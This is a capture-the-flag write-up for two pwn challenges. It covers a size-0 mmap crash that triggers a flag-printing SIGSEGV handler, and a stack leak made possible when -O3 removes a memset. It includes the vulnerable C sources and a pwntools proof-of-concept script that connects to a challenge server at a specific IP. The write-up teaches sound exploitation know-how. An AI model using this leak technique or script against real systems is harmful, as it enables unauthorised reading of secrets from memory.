# IEREA CTF 2025


## Challenges: Length Calculator & Stdio_studio
**Total Points:** 288 \
**Category:** Pwn

---

## TL;DR

[These challenges are about the importance of handling edge cases and various input signals.]

---

## Length Calculator:
- **chal** : ELF binary.
- **chal.c** : source file

```
// gcc chal.c -o chal

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/mman.h>

void win(int sig) {
  puts("Well done!");
  system("cat ./flag*");
  exit(0);
}

int main() {
  // If you cause SEGV, then you will get flag
  signal(SIGSEGV, win);
  setbuf(stdout, NULL);

  while (1) {
    unsigned int size = 100;
    
    printf("Enter size: ");
    scanf("%u%*c", &size);
    
    char *buf = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (!buf) {
      puts("Too large!");
      exit(1);
    }
    
    printf("Input: ");
    fgets(buf, size, stdin);
    buf[strcspn(buf, "\n")] = '\0';
    
    printf("Your string length: %d\n", strlen(buf));
  }
}
```


From the source code, we can that a `win()` function is given, and in order to call it, a SIGSEGV signal must be triggered: `signal(SIGSEGV, win);`

So, by simply giving `0` as size, the instruction `buf[strcspn(buf, "\n")] = '\0'; ` causes a SIGSEGV because `buf` has size 0, it tries to write `\0` into `buf[strcspn(buf, "\n")]`. 


IMAGE


## Stdio_studio:
- **chal** : ELF binary.
- **chal.c** : source file

Here's `chal.c`:

```
// gcc chal.c -o chal -O3

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void load_flag() {
  char flag[128] = "";

  FILE *fp = fopen("flag.txt", "rb");
  if (!fp) {
    puts("Something went wrong. Call admin.");
    exit(1);
  }

  fread(flag, sizeof(char), 128, fp);
  fclose(fp);

  // puts(flag); // Sorry! No flag for you!
  memset(flag, 0, 128); // The secret should be cleared up
}

void echo(void) {
  unsigned int size;
  char *buf;

  printf("Size: ");
  scanf("%u%*c", &size);

  buf = alloca(size);
  if (!buf) {
    puts("Too large!");
    exit(1);
  }

  printf("Input: ");
  fgets(buf, size, stdin);

  sleep(1);

  printf("Output: %s\n", buf);
}

int main() {
  setbuf(stdout, NULL);

  puts("1. Load flag");
  puts("2. Echo");

  while (1) {
    int cmd;

    printf("Enter command: ");

    scanf("%d%*c", &cmd);

    if (cmd == 1) load_flag();
    else if (cmd == 2) echo();
    else {
      puts("Invalid command :(");
      return 0;
    }
  }
}
```
First off, notice that the binary is compiled with the command `gcc chal.c -o chal -O3`, and keep it for later.

We've got 3 functions, `main()` and `echo()` and `load_flag()`.\
The main function queries us to either tap 1 to load the flag into memory, or 2 to read the stack.

### Analysis:
Let's start with `echo()`:
```
  printf("Size: ");
  scanf("%u%*c", &size);

  buf = alloca(size);
  if (!buf) {
    puts("Too large!");
    exit(1);
  }

  printf("Input: ");
  fgets(buf, size, stdin);

  sleep(1);

  printf("Output: %s\n", buf);
  ```

Basically, this function asks for a size from the user, and then uses it to allocate stack memory with `alloca()`, and reads from stdin and displays the content of the buffer(...and beyond). \
**Note**: Alloca(size) is equivalent to a simple `sub rsp, sz`; so it's not like a heap allocation.

Let's move on to `load_flag()`:
```
  char flag[128] = "";

  FILE *fp = fopen("flag.txt", "rb");
  if (!fp) {
    puts("Something went wrong. Call admin.");
    exit(1);
  }

  fread(flag, sizeof(char), 128, fp);
  fclose(fp);

  // puts(flag); // Sorry! No flag for you!
  memset(flag, 0, 128); // The secret should be cleared up
```

This function reads the flag from *flag.txt*, stores it in a buffer, and then seemingly clearing it up at the end.

But wait, remember that the binary is compiled with the `-O3` option.\
The -O3 option in GCC enables the highest level of standard optimization. It includes all optimizations from -O2 plus additional optimizations. So in a nutshell, the line `memset(flag, 0, 128);` is opitimized out, hence, the flag still lives in memory.


### Exploitation strategy:
- Since calling `echo()`after `load_function()`, makes its stack frame live in - roughly - the same exact addresses as the latter, we can print the flag by iterating through 1 to 111 (for example) and try to make our input contiguous to the flag bytes, so that printf catches it and prints along with the data supplied.


**PoC:**

```

from pwn import *


for i in range(20, 111):
    #p = process('./chal')
    p = remote('35.187.219.36', 33335)
    p.recv()
    p.sendline(b'1')
    p.recv()
    p.sendline(b'2')
    p.recv()
    p.sendline(str(i).encode())
    p.recv()
    p.shutdown('send')
    res = p.recvuntil(b"Enter command: ")
    if b'IERAE{' in res:
        print(res)

    p.close()

```


IMAGE
